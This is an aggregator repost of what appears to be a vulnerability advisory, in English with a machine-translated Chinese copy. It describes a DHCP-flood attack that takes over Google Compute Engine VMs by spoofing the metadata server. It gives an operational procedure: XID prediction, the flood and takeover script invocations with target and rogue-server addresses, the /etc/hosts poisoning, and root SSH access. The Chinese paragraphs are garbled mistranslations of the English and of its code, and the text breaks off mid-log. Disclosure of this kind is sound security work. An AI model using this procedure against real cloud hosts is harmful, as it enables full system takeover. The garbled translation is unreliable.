<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Google Compute引擎（GCE）VM“远程”根源通过DHCP泛滥 Google Compute Engine (GCE) VM “remote” root exploit via DHCP flood</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=5effb96910009800120b8d4d&product=inline-share-buttons" async="async"></script>
<script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">Google Compute Engine (GCE) VM “remote” root exploit via DHCP flood<br/>Google Compute引擎（GCE）VM“远程”根源通过DHCP泛滥 </h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2021-06-29 22:24:34</div><div class="story_img_container"><a href="http://img2.diglog.com/img/2021/6/05ba6887303c6ae61423c04e4ac37c61.png"><img src="http://img2.diglog.com/img/2021/6/05ba6887303c6ae61423c04e4ac37c61.png" class="img-fluid my_story_img" onerror="this.style.display='none'"></a></div><div class="page_narrow text-break page_content"><p>This is an advisory about an unpatched vulnerability (at time of publishing this repo, 2021-06-25) affectingvirtual machines in Google&#39;s Compute Engine platform.The technical details below is almost exactly the same as my report sent to the VRP team.</p><p>这是一个关于未分割漏洞的咨询（在发布此押金时，2021-06-25）影响Google＆＃39; S Compute Engine平台的Virtual Machine。以下技术细节几乎与发送给VRP的报告完全相同团队。</p><p> Attackers could take over virtual machines of the Google Cloud Platform over the network due to weakrandom numbers used by the ISC DHCP software and an unfortunate combination of additional factors.This is done by impersonating the Metadata server from the targeted virtual machine&#39;s point of view.By mounting this exploit, the attacker can grant access to themselves over SSH (public key authentication)so then they can login as the root user.</p><p> 由于ISC DHCP软件使用的弱势数以及其他因素的不幸组合，攻击者可以通过网络接管谷歌云平台的虚拟机。这是通过从目标虚拟机＆＃39的模拟元数据服务器冒充元数据服务器来完成的view.by安装此exproit，攻击者可以通过ssh（公钥身份验证）授予自己的访问权限，因此它们可以作为root用户登录。</p><p>  ISC&#39;s implementation of the DHCP client (isc-dhcp-client package on the Debian flavors) relies onrandom(3) to generate pseudo-random numbers (a nonlinear additive feedback random).It is  seeded with the srandom function as follows:</p><p>  ISC＆＃39; DHCP客户端（Debian Flavors上的ISC-DHCP-Client Package）的实现依赖于onrandom（3）来生成伪随机数（无线添加剂随机反馈）。旨在与SRANDOM功能一起种子：</p><p> /* Make up a seed for the random number generator from current	 time plus the sum of the last four bytes of each	 interface&#39;s hardware address interpreted as an integer.	 Not much entropy, but we&#39;re booting, so we&#39;re not likely to	 find anything better. */	seed = 0;	for (ip = interfaces; ip; ip = ip-&gt;next) {		int junk;		memcpy(&amp;junk,		 &amp;ip-&gt;hw_address.hbuf[ip-&gt;hw_address.hlen -					 sizeof seed], sizeof seed);		seed += junk;	}	srandom(seed + cur_time + (unsigned)getpid());</p><p> / *从当前时间组成随机数发生器的种子加上每个接口的最后四个字节的总和＆＃39; s硬件地址被解释为整数。没有太多的熵，但我们＆＃39;重新启动，所以我们＆＃39;重复没有找到更好的东西。 * /种子= 0; for（IP =接口; IP; IP = IP-＆gt; next）{int junk; Memcpy（＆amp;垃圾，＆amp; ip-＆gt; hw_address.hbuf [Ip-＆gt; hw_address.hlen  -  sizeof seed]，sizeof seed）;种子+ =垃圾; srandom（种子+ cur_time +（unsigned）getPid（））;</p><p>  the sum of the last 4 bytes of the ethernet addresses (MAC) of the network interface cards</p><p>  网络接口卡的以太网地址（Mac）的最后4个字节的总和</p><p> On the Google Cloud Platform, the virtual machines usually have only 1 NIC, something like this:</p><p> 在Google Cloud平台上，虚拟机通常只有1个NIC，这样的东西：</p><p> root@test-instance-1:~/isc-dhcp-client/real3# ifconfigens4: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1460 inet 10.128.0.2 netmask 255.255.255.255 broadcast 10.128.0.2 inet6 fe80::4001:aff:fe80:2 prefixlen 64 scopeid 0x20&lt;link&gt; ether 42:01:0a:80:00:02 txqueuelen 1000 (Ethernet) RX packets 1336873 bytes 128485980 (122.5 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 5708403 bytes 2012678044 (1.8 GiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0</p><p> 根@ test-instance-1：〜/ isc-dhcp-client / real3＃ifconfigens4：flags = 4163＆lt;上升，播放，运行，多播＆gt; MTU 1460 INET 10.128.0.2 NetMask 255.255.255.255播放10.128.0.2 INET6 FE80 :: 4001：AFF：FE80：2 Prefixlen 64 ScopeID 0x20＆lt;链接＆gt;乙醚42：01：0A：80：00：02 Txqueulen 1000（以太网）RX数据包1336873字节128485980（122.5 MIB）RX误差0丢弃0 operruns 0帧0 Tx包5708403字节2012678044（1.8 Gib）Tx误差0丢弃0 operruns 0载波0碰撞0 </p><p> Note that the last 4 bytes ( 0a:80:00:02) of the MAC address ( 42:01:0a:80:00:02) are actually the same asthe internal IP address of the box ( 10.128.0.2). This means, 1 of the 3 components is effectively public.</p><p>请注意，MAC地址的最后4个字节（0a：80：00：02）（42：01：0a：80：00：02）实际上是框的内部IP地址（10.128.0.2）。这意味着3个组件中的1个是有效的。</p><p> The pid of the dhclient process is predictable. The linux kernel assigns process IDs in a linear way.I found that the pid varies between 290 and 315 (by rebooting a Debian 10 based VM many times andchecking the pid), making this component of the seed easily predictable.</p><p> DHClient过程的PID可预测。 Linux内核以线性方式分配进程ID.i发现PID在290和315之间变化（通过重新启动基于Debian 10的VM多次和检查PID），使得种子的这种组件容易预测。</p><p> The unix time component has a more broad domain, but this turns out to be not a practical problem (see later).</p><p> UNIX时间组件具有更广泛的域，但这结果不是实际问题（请参阅以后）。</p><p> The firewall/router of GCP blocks broadcast packets sent by VMs, so only the metadata server (169.254.169.254)receives them. However, some phases of the DHCP protocol don&#39;t rely on broadcasts, and the packets to be sentcan be easily calculated and sent in advance.</p><p> GCP的防火墙/路由器通过VM发送的广播数据包，因此只有元数据服务器（169.254.169.254）收到它们。但是，DHCP协议的某些阶段Don＆＃39; t依赖广播，并且可以通过预先计算和发送的数据包。</p><p> To mount this attack, the attacker needs to craft multiple DHCP packets using a set of precalculated/suspectedXIDs and flood the victim&#39;s dhclient directly (no broadcasts here). If the XID is correct, the victim machine appliesthe network configuration. This is a race condition, but since the flood is fast and exhaustive, the metadata serverhas no real chance to win.</p><p> 要安装此攻击，攻击者需要使用一组预先计算/疑似XID和直接泛滥的DHCP数据包进行泛滥（这里没有广播）。如果xid是正确的，受害者机器alpiesthe网络配置。这是一个种族条件，但由于洪水快速和彻底，元数据server以及没有真正的胜利机会。</p><p> At this point the attacker is in the position of reconfiguring the network stack of the victim.</p><p> 此时，攻击者处于重新配置受害者的网络堆栈的位置。</p><p> Google heavily relies on the Metadata server, including the distribution of ssh public keys.The connection is secured at the network/routing layer and the server is not authenticated (no TLS, clearhttp only). The  google_guest_agent process, that is responsible for processing the responses of theMetadata server, establishes the connection via the virtual hostname  metadata.google.internal whichis an alias in the  /etc/hosts file. This file is managed by  /etc/dhcp/dhclient-exit-hooks.d/google_set_hostnameas a hook part of the DHCP response processing and the alias is normally added by this script at eachDHCPACK.By having full control over DHCP, the Metadata server can be impersonated. This attack has been found anddocumented by  Chris Moberly, who inspired my research with his oslogin privesc write up here:</p><p> Google依赖于元数据服务器，包括SSH公钥的分发。连接在网络/路由层处于网络/路由层，服务器未经身份验证（仅限TLS，Clearhttp）。 Google_Guest_Agent进程，负责处理ThemetAdata Server的响应，通过虚拟主机名Metadata.Google.Internal在/ etc / hosts文件中建立连接。此文件由/etc/dhcp/dhclient-exit-hooks.d/google_set_hostnameAs管理DHCP响应处理的挂钩部分，并且别名通常由此脚本添加到每个DHCPACK中。Metadata Server可以完全控制DHCP。冒充。这次攻击已经发现了克里斯莫格莱斯的攻击，他用他的奥斯洛宾普罗斯康促进了我的研究在这里： </p><p>  The difference is, flooding of the dhclient process is done remotely in my attack and the XIDs are guessed.</p><p>差异是，Dhclient过程的洪水在我的攻击中远程完成，猜测XID。</p><p>  #1 Instructing the client to set the IP address of the rogue metadata server on the NIC.No router is configured. This effectively cuts the internet connection of the box. google_guest_agent can&#39;t fall back to connecting the real metadata server.This DHCP lease is short lived (15 seconds), so dhclient sends a DHCPREQUEST soon again and starts lookingfor a new DHCPACK.</p><p>  ＃1指示客户端配置NIC上的Rogue Metadata Server的IP地址。这有效地切断了盒子的互联网连接。 Google_Guest_Agent Can＆＃39; t返回连接真实的元数据服务器。这是DHCP租约短暂的（15秒），所以Dhclient再次发送DHCPRequest并开始寻找新的DHCPACK。</p><p> Since a new ip address (the rouge metadata server) and new hostname ( metadata.google.com) is part of thisDHCPACK packet, the  google_set_hostname function adds two lines like like below (35.209.180.239 is the rougemetadata server I used):</p><p> 由于新的IP地址（Rouge Metadata Server）和新主机名（MetAdata.Google.com）是该TheDhcpack数据包的一部分，因此Google_set_hostname函数添加了如下所示的两条线（35.209.180.239是我使用的rougemetadata server）：</p><p>  The attacker is still flooding at this point, and since ARP is not flushed quickly, these packets arestill delivered.</p><p>  此时攻击者仍在洪水，因为ARP不会快速刷新，因此这些数据包颁发。</p><p> #2. Restoring a working network stack, along with the valid router address. This DHCPACK does not contain a hostname,so  google_set_hostname won&#39;t touch  /etc/hosts. The poisoned  metadata.google.internal entry remains in there.</p><p> ＃2。还原工作网络堆栈以及有效的路由器地址。这个dhcpack不包含主机名，因此google_set_hostname won＆＃39; t触摸/ etc / hosts。中毒元数据.Google.internal条目仍在那里。</p><p> In case multiple entries are present in the hosts file, the Linux kernel prioritizes the link-local address(169.254.169.254) lower than the routable ones.</p><p> 如果在主机文件中存在多个条目，则Linux内核优先考虑链接本地地址（169.254.169.254）低于可路由器。</p><p> At this point  google_guest_agent can establish a TCP connection to the (rouge) metadata server, where it getsa config that contains the attacker&#39;s ssh public key. The entry is populated into  /root/.ssh/authorized_keysand the attacker can open a root shell remotely.</p><p> 此时Google_guest_Agent可以与（Rouge）元数据服务器建立TCP连接，其中包含攻击者的GetSA配置。将该条目填充到/root/.ssh/authorized_keysand中，攻击者可以远程打开根壳。 </p><p>  Attackers would gain full access to the targeted virtual machines in all attack scenarios below.</p><p>攻击者将在下面的所有攻击情景中完全访问目标虚拟机。</p><p> Attack #1: Targeting a VM on the same subnet (~same project), while it is rebooting.The attacker needs presence on another host.</p><p> 攻击＃1：针对同一子网（〜相同项目）的VM，而它正在重新启动。攻击者需要在另一个主机上存在。</p><p> Attack #2: Targeting a VM on the same subnet (~same project), while it is refreshing the lease (so no reboot is needed).This takes place every half an hour (1800s), making 48 windows/attempts possible a day.Since an F class VM has ~170.000 pps (packet per second), and a day of unixtime + potential pids makes ~86420 potentialXIDs, this is a feasible attack vector.</p><p> 攻击＃2：针对同一子网（〜相同项目）的VM，而刷新租约（因此不需要重新启动）。这是每半个小时（1800s）进行每半个小时，让48个窗口/尝试。F级VMS有〜170.000 PPS（每秒数据包），并且一天的UNIXTIET +潜在的PID制作〜86420个潜在XID，这是一个可行的攻击矢量。</p><p> Attack #3: Targeting a VM over the internet. This requires the firewall in front of the victim VM to be fully open.Probably not a common scenario, but since even the webui of GCP Cloud Console has an option for that, there must bequite some VMs with this configuration.In this case the attacker also needs to guess the internal IP address of the VM, but since the first VM seemsto get  10.128.0.2 always, the attack could work, still.</p><p> 攻击＃3：通过互联网定位VM。这需要在受害者VM前面的防火墙完全打开。可以完全打开。可以避免常见场景，但由于即使GCP云控制台的WebUI也有一个选项，则必须存在此配置的一些VM。在这种情况下攻击者还需要猜测VM的内部IP地址，但自从第一个VM Seepsto获得10.128.0.2始终，攻击可以工作。</p><p>   As described above, you need to run a rogue metadata server running a host with port 80 open from the internet.I used 35.209.180.239 for this purpose (this is the public IP address of 10.128.0.2, a compute engine box actually),meta.py is running here:</p><p>   如上所述，您需要运行运行主机的Rogue元数据服务器，该服务器与端口80从Internet开立.I为此目的使用了35.209.180.239（这是10.128.0.2的公共IP地址，实际上是一个计算引擎盒）， meta.py在这里运行：</p><p>  My proof of concept exploits a simplified setup, when the victim box is being rebooted. In this case unixtimeof the dhclient process can be guessed easily.</p><p>  当受害框重新启动时，我的概念证明利用了简化的设置。在这种情况下，可以轻松猜测DHClient过程的UNIXTIMEOF。</p><p>  The victim box is  10.128.0.4 here. The public IP address of this host is  34.67.219.89.Verifying first we don&#39;t have access using the RSA private key that belongs to id_rsa.pub referenced abovefor meta.py:</p><p>  受害框在这里是10.128.0.4。此主机的公共IP地址为34.67.219.89.首先，首先，我们使用属于ID_RSA.pub的RSA私钥访问，我们可以访问id_rsa.pub，for meta.py： </p><p>    Then I type reboot on the victim host ( 10.128.0.4). The rest of the output of  takeover-at-reboot.pl:</p><p>然后我在受害者主机上键入重新启动（10.128.0.4）。 takeover -at -reboot.pl的其余输出：</p><p> 10.128.0.4 seems to be not alive anymore	RUN: ip addr show dev ens4 | awk &#39;/inet / {print $2}&#39; | cut -d/ -f1	RUN: ip route show default | awk &#39;/via/ {print $3}&#39;	NIC: ens4	Min pid: 290	Max pid: 315	Min ts: 1601231808	Max ts: 1601231823	My IP: 10.128.0.2	Router: 10.128.0.1	Target IP: 10.128.0.4	Target MAC: 42:01:0a:80:00:04	Number of potential xids: 41	Initial OFFER+ACK flood	MAC: 42:01:0a:80:00:04	Src IP: 10.128.0.2	Dst IP: 10.128.0.4	New IP: 35.209.180.239	New hostname: metadata.google.internal	New route:	ACK: true	Offer: true	Oneshot: false	Flooding again to revert the original network config	MAC: 42:01:0a:80:00:04	Src IP: 10.128.0.2	Dst IP: 10.128.0.4	New IP: 10.128.0.4	New hostname:	New route: 10.128.0.1	ACK: true	Offer: false	Oneshot: false</p><p> 10.128.0.4似乎不再运行了：IP Addr show dev ens4 | awk＆＃39; / INET / {打印$ 2}＆＃39; | CUT -D / -F1运行：IP路由显示默认| awk＆＃39; /通过/ {打印$ 3}＆＃39; NIC：ENS4 MIN PID：290 MAX PID：315 MIN TS：1601231808 MAX TS：1601231823我的IP：10.128.0.2路由器：10.128.0.1目标IP：10.128.0.4目标MAC：42：01：0A：80：00：04潜在XID数量：41初始报价+ ACK洪水MAC：42：01：0A：80：00：04 SRC IP：10.128.0.2 DST IP：10.128.0.4新IP：35.209.180.239新主机名：MetAdata.Google.Internal新路线：ACK：真实报价：真实的oneShot：错误洪水再次恢复原始网络配置Mac：42：01：0A：80：00：04 SRC IP：10.128.0.2 DST IP：10.128.0.4新IP：10.128。 0.4新主机名：新路线：10.128.0.1 ACK：真实优惠：False OneShot：False</p><p> After this point, the output of the screen where meta.py is running is flooded with lines like this:</p><p> 在此之后，Meta.py正在运行的屏幕的输出被淹没，如下所示的行淹没：</p><p>  At this point, I can login to victim box using the new (attacker controlled) SSH key.</p><p>  此时，我可以使用新的（攻击者控制）SSH键登录受害框。</p><p> root@builder:/opt/_tmp/dhcp/exploit# ssh -i id_rsa root@34.67.219.89	Linux metadata 4.19.0-11-cloud-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64	The programs included with the Debian GNU/Linux system are free software;	the exact distribution terms for each program are described in the	individual files in /usr/share/doc/*/copyright.	Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent	permitted by applicable law.	root@metadata:~# id	uid=0(root) gid=0(root) groups=0(root),1000(google-sudoers)</p><p> root @ builder：/ opt / _tmp / dhcp / exproit＃ssh -i id_rsa root@34.67.219.89 Linux元数据4.19.0-11-cloud-amd64＃1 SMP Debian 4.19.146-1（2020-09-17）x86_64 Debian GNU / Linux系统中包含的程序是免费软件;每个程序的确切分配项在/ usr / share / doc / * /版权中的各个文件中描述。 Debian GNU / Linux绝对没有保修，在适用法律允许的范围内。根@元数据：〜＃id uid = 0（root）gid = 0（root）组= 0（root），1000（Google-sudoers）</p><p>   To verify this setup, I built a slightly modified version of dhclient; besides some additional log lines the only important change is theincreased frequency of lease renewals:</p><p>   要验证此设置，我构建了一个略微修改的dhclient版本;除了一些额外的日志线外，唯一一个重要的变化是进入租赁续期的频率：</p><p> *** dhclient.c.orig 2020-09-29 23:38:16.322296529 +0200--- dhclient.c 2020-09-29 22:51:11.000000000 +0200*************** void bind_lease (client)*** 1573,1578 ****--- 1573,1580 ---- client-&gt;new = NULL; /* Set up a timeout to start the renewal process. */+ client-&gt;active-&gt;renewal = cur_time + 5; // hack!+ tv.tv_sec = client-&gt;active-&gt;renewal; tv.tv_usec = ((client-&gt;active-&gt;renewal - cur_tv.tv_sec) &gt; 1) ? myrandom(&#34;active renewal&#34;) % 1000000 : cur_tv.tv_usec;</p><p> *** DHCLIENT.C.ORIG 2020-09-29 23：38：16.322296529 +0200 --- DHCLIENT.C 2020-09-29 22：51：11.000000000 +0200 ************ *** void bind_lease（客户）*** 1573,1578 **** --- 1573,1580 ----客户 - ＆gt; new = null; / *设置超时以启动续订流程。 * / +客户端 - ＆gt; entive-＆gt; enewal = cur_time + 5; // hack！+ tv.tv_sec = client-＆gt; entive-＆gt;续约; TV.TV_USEC =（（客户端 - ＆gt; entive-＆gt; engewal  -  cur_tv.tv_sec）＆gt; 1）？ myrandom（＆＃34;活动续约＆＃34;）％1000000：cur_tv.tv_usec; </p><p> A 10 minute window consists of ~600 potetial XIDs. I rebooted the victim host ( 10.128.0.4), logged in, ran journalctl -f|grep dhclient to see what is going on. Then I executed the  takeover-at-renew.pl scripton the attacker machine (internal ip:  10.128.0.2, external ip:  35.209.180.239, a VM on the same subnet):</p><p>一个10分钟的窗户由〜600个翅膀组成。我重新启动了受害者主机（10.128.0.4），登录，RAN JournalCTL -F | Grep Dhclient查看正在发生的事情。然后我执行了TakeOver-At-renew.pl Scripton攻击者机器（内部IP：10.128.0.2，外部IP：35.209.180.239，同一子网上的VM）：</p><p>   Oct 02 07:06:05 test-instance-2 dhclient[301]: DHCPREQUEST for 10.128.0.4 on ens4 to 169.254.169.254 port 67Oct 02 07:06:05 test-instance-2 dhclient[301]: DHCPACK of 10.128.0.4 from 169.254.169.254Oct 02 07:06:05 test-instance-2 dhclient[301]: bound to 10.128.0.4 -- renewal in 5 seconds.Oct 02 07:06:10 test-instance-2 dhclient[301]: DHCPREQUEST for 10.128.0.4 on ens4 to 169.254.169.254 port 67Oct 02 07:06:10 test-instance-2 dhclient[301]: DHCPACK of 10.128.0.4 from 169.254.169.254Oct 02 07:06:11 test-instance-2 dhclient[301]: bound to 10.128.0.4 -- renewal in 5 seconds.Oct 02 07:06:16 test-instance-2 dhclient[301]: DHCPREQUEST for 10.128.0.4 on ens4 to 169.254.169.254 port 67Oct 02 07:06:16 test-instance-2 dhclient[301]: DHCPACK of 10.128.0.4 from 169.254.169.254Oct 02 07:06:16 test-instance-2 dhclient[301]: bound to 10.128.0.4 -- renewal in 5 seconds.Oct 02 07:06:21 test-instance-2 dhclient[301]: DHCPREQUEST for 10.128.0.4 on ens4 to 169.254.169.254 port 67Oct 02 07:06:21 test-instance-2 dhclient[301]: DHCPACK of 10.128.0.4 from 169.254.169.254Oct 02 07:06:21 test-instance-2 dhclient[301]: bound to 10.128.0.4 -- renewal in 5 seconds.Oct 02 07:06:26 test-instance-2 dhclient[301]: DHCPREQUEST for 10.128.0.4 on ens4 to 169.254.169.254 port 67Oct 02 07:06:26 test-instance-2 dhclient[301]: DHCPACK of 10.128.0.4 from 169.254.169.254Oct 02 07:06:26 test-instance-2 dhclient[301]: bound to 10.128.0.4 -- renewal in 5 seconds.Oct 02 07:06:31 test-instance-2 dhclient[301]: DHCPREQUEST for 10.128.0.4 on ens4 to 169.254.169.254 port 67Oct 02 07:06:31 test-instance-2 dhclient[301]: DHCPACK of 35.209.180.239 from 10.128.0.2Oct 02 07:06:32 metadata dhclient[301]: bound to 35.209.180.239 -- renewal in 5 seconds.Oct 02 07:06:37 metadata dhclient[301]: DHCPREQUEST for 35.209.180.239 on ens4 to 35.209.180.239 port 67Oct 02 07:06:44 metadata dhclient[301]: DHCPREQUEST for 35.209.180.239 on ens4 to 35.209.180.239 port 67Oct 02 07:06:46 metadata dhclient[301]: DHCPACK of 10.128.0.4 from 10.128.0.2Oct 02 07:06:47 metadata dhclient[301]: bound to 10.128.0.4 -- renewal in 5 seconds.</p><p>   10月07日07:06:05测试 - 【举例型 -  2 DHClient [301]：DHCPREQUEST为10.128.0.4 ens4到169.254.169.254端口670254 07:06:05 TEST-instance-2 dhclient [301]：DHCPACK为10.128。 0.4从169.254.169.2540CT 02 07:06:05 Test-instance-2 Dhclient [301]：绑定到10.128.0.4  - 续订5秒.Oct 02 07:06:10测试 -  instance-2 dhclient [301] ：DHCPREQUEST为10.128.0.4在ENS4到169.254.169.254端口670CT 02 07:06:10 TEST-instance-2 dhclient [301]：101.128.0.4从169.254.169.254oct 02 07:06:11测试 - 实例 - 2 dhclient [301]：绑定到10.128.0.4  - 续订5秒。02 07:06:16测试 - 案例-2 dhclient [301]：DHCPREQUEST为10.128.0.4 on ENS4到169.254.169.254端口67oct 02 07 ：06：16 Test-instance-2 Dhclient [301]：10.128.0.4的DHCPACK从169.254.169.2540CT 02 07:06:16测试 -  instance-2 dhclient [301]：绑定到10.128.0.4  -  5 seconds.oct 02 07:06:21 Test-instance-2 Dhclient [301]：DHCPRequest为10.128.0.4在ENS4到169.254.169.254端口670254 02 07:06:21 Test-Instanc E-2 DHCLIENT [301]：10.128.0.4的DHCPACK从169.254.169.2540CT 02 07:06:21测试 -  instance-2 dhclient [301]：绑定到10.128.0.4  - 续订5秒.Oct 02 07： 06:26 Test-instance-2 Dhclient [301]：DHCPREQUEST为10.128.0.4，在ENS4到169.254.169.254端口670.254 07:06:26 TEST-instance-2 Dhclient [301]：10.128.0.4的DHCPACK of 169.254。 169.254OCT 02 07:06:26 Test-instance-2 dhclient [301]：绑定到10.128.0.4  - 续订5秒。02 07:06:31测试 - 案例-2 dhclient [301]：DHCPREQUEST为10.128 .0.4 ON ENS4到169.254.169.254端口670CT 02 07:06:31 Test-instance-2 Dhclient [301]：35.209.180.239的Dhcpack从10.128.0.2oct 02 07:06:32元数据dhclient [301]：绑定到35.209.180.239  - 续约在5秒内.OCT 02 07:06:37元数据Dhclient [301]：DHCPRequest为35.209.180.239 ens4到35.209.180.239端口670ct 02 07:06:44 Metadata Dhclient [301]：dhcprequest 35.209.180.239在ens4到35.209.180.239端口670ct 02 07:06:46元数据Dhclient [301]：Dhcpack为10.128.0.4从1 0.128.0.2oct 02 07:06:47元数据Dhclient [301]：绑定到10.128.0.4  - 在5秒内更新。</p><p> This means the 6th round was successful. With &#34;normal&#34; lease renewal (unpatched  dhclient), the same thing would havetaken ~3 hours.</p><p> 这意味着第六轮是成功的。与＃34;正常＆＃34;租赁更新（未被批准的Dhclient），同样的事情会留下〜3个小时。</p><p>  root@test-instance-2:~# cat /etc/hosts127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allrouters35.209.180.239 metadata.google.internal metadata # Added by Google169.254.169.254 metadata.google.internal # Added by Google</p><p>  root @ test-instance-2：〜＃cat /etc/hosts127.0.0.1 localhost :: 1 localhost ip6-localhost ip6-loopbackff02 :: 1 ip6-allnodesff02 :: 2 ip6-allrouters35.209.180.239元数据.gooll。 Google169.254.169.254添加的内部元数据＃169.254 Metadata.Google.Internal＃添加到Google</p><p> I repeated the attack and flooded the victim with 3 hours of XIDs (~10000). The 51th DHCPREQUEST was hijacked (wouldhave taken a little bit more than a complete day with &#34;normal&#34; lease times).I concluded that the execution time indeed correlates with the number of XIDs.This of course would decrease the success rate in real life setups, but the attack is still feasible.</p><p> 我重复攻击并用3个小时的XIDS（〜10000）淹没了受害者。第51次DHCPREQUEST被劫持（不会比与＆＃34的完整日拍摄的一点点，＆＃34;常规＆＃34;租约时代）。我得出结论，执行时间确实与xids的数量相关联。当然会降低成功在现实生活设置中的速度，但攻击仍然可行。</p><p>   I found that my DHCP related packets were not forwarded to the VM while the VM is rebooting (probably not after thelease is returned at reboot), effectively ruling out  takeover-at-discover.pl.</p><p>   我发现我的DHCP相关数据包没有转发到VM，而VM正在重新启动（可能不是在重启时返回Thelease后），有效地排除了TakeOver-at-discover.pl。</p><p> I decided to carry out an attack against the lease renewal (effectively the same as #2). My expectation was that it shouldstill be feasible.</p><p> 我决定对租赁续约进行攻击（有效地与＃2相同）。我的期望是它应该是可行的。 </p><p> I tested this scenario using an AWS VM as the attacker machine and a really short time window (2 minutes).The  meta.py script was still running on the GCP attacker machine (external ip: 35.209.180.239).I rebooted the victim machine (internal ip:  10.128.0.4, external ip:  34.122.27.253), logged in, ran  journalctl -f|grep dhclient.</p><p>我使用AWS VM作为攻击机和一个非常短的时间窗口测试了这种情况（2分钟）。元脚本仍在GCP攻击机（外部IP：35.209.180.239）上运行.i重新启动受害者机器（内部IP：10.128.0.4，外部IP：34.122.27.253），登录，RAN JournalCTL -F | Grep Dhclient。</p><p>  root@ip-172-31-25-197:~/real8# NIC=eth0 ONESHOT_WINDOW_MIN=2 FINAL_IP=10.128.0.4 MY_ROUTER=10.128.0.1 ./takeover-at-renew.pl 34.122.27.253 35.209.180.239Flooding destination between with XIDs between 1601651865 and 1601651984RUN: ip addr show dev eth0 | awk &#39;/inet / {print $2}&#39; | cut -d/ -f1RUN: /root/real8/randr 10.128.0.4 290 315 1601651865 1601651984 2&gt;/dev/null | paste -sd &#39;,&#39; - &gt;/tmp/xids.txtNIC: eth0Min pid: 290Max pid: 315Min ts: 1601651865Max ts: 1601651984Attacker IP: 172.31.25.197Router: 10.128.0.1Target IP (initial phase): 34.122.27.253Target MAC: 42:01:0a:80:00:04Target IP (final phase): 10.128.0.434.122.27.253 is aliveStart flooding the victim for 1801 secAnd monitoring it in the backgroundRunning for 1801 sec in the background: /root/real8/flood -ack -lease 15 -dev eth0 -dstip 34.122.27.253 -newhost metadata.google.internal -newip 35.209.180.239 -srcip 172.31.25.197 -mac 42:01:0a:80:00:04 -xidfile /tmp/xids.txtMAC: 42:01:0a:80:00:04Src IP: 172.31.25.197Dst IP: 34.122.27.253New IP: 35.209.180.239New hostname: metadata.google.internalNew route:ACK: trueOffer: falseOneshot: falseNumber of XIDs: 145The host is down, it probably swallowed the poison ivy!And now some flood again to revert connectivityit seems the attack was successfulroot@ip-172-31-25-197:~/real8# Running for 12 sec in the background: /root/real8/flood -ack -ack -lease 1800 -dev eth0 -dstip 34.122.27.253 -newip 10.128.0.4 -route 10.128.0.1 -srcip 172.31.25.197 -mac 42:01:0a:80:00:04 -xidfile /tmp/xids.txtMAC: 42:01:0a:80:00:04Src IP: 172.31.25.197Dst IP: 34.122.27.253New IP: 10.128.0.4New hostname:New route: 10.128.0.1ACK: trueOffer: falseOneshot: falseNumber of XIDs: 145</p><p>  root @ ip-172-31-25-197：〜/ real8＃nic = eth0 oneShot_window_min = 2 final_ip = 10.128.0.4 my_router = 10.128.0.1 ./takeover-at-renew.pl 34.122.27.253 35.209.180.239在1601651865和1601651984RUN之间的XIDS：IP ADDR SHOW DEV ETH0 | awk＆＃39; / INET / {打印$ 2}＆＃39; | CUT -D / -F1RUN：/ ROOT / REAL8 / RANDR 10.128.0.4 290 315 16016519865 1601651984 2＆gt; / dev / null |粘贴-sd＆＃39;，＆＃39; - ＆gt; /tmp/xids.txtric：eth0min pid：290max pid：315min ts：1601651865max ts：1601651865max ts：1601651984Attacker IP：172.31.25.197Router：10.128.0.1target IP（初始阶段）：34.122.27.253target Mac：42:01： 0A：80：00：04Target IP（最终阶段）：10.128.0.434.122.27.253是洪水淹没了1801年SEC的受害者，在背景中监测了1801秒的背景：/ ROOT / REAL8 /洪水 - 破坏15 -DEV eth0 -dstip 34.122.27.253-newhost metadata.google.internal -newip-newip 35.209.180.239 -srcip 172.31.25.197 -mac 42：01：0a：80：00：04 -xidfile /tmp/xids.txtmac：42： 01：0A：80：00：04SRC IP：172.31.25.197DST IP：34.122.27.253NEW IP：35.209.180.239NEW主机名：METAData.Google.InternalNEW路由：ACK：TRUEOFFER：FalseNeLESHOT：XIDS的Falsenumber：145主机已关闭，它可能吞噬了毒药常春藤！现在有些洪水再次恢复连接似乎攻击是成功的@ IP-172-31-25-197：〜/ Real8＃在后台运行12秒：/ root / real8 /洪水-ack -ack -lease 1800 -dev eth0 -DSTIP 34.122.27.253 -NEWIP 10.128.0.4 -Route 10.128.0.1 -SRCIP 172.31.25.197 -MAC 42：01：0A：80：00：04 -XIDFILE /TMP/XIDS.TXTMAC：42：01：0A：80： 00：04SRC IP：172.31.25.197DST IP：34.122.27.253NEW 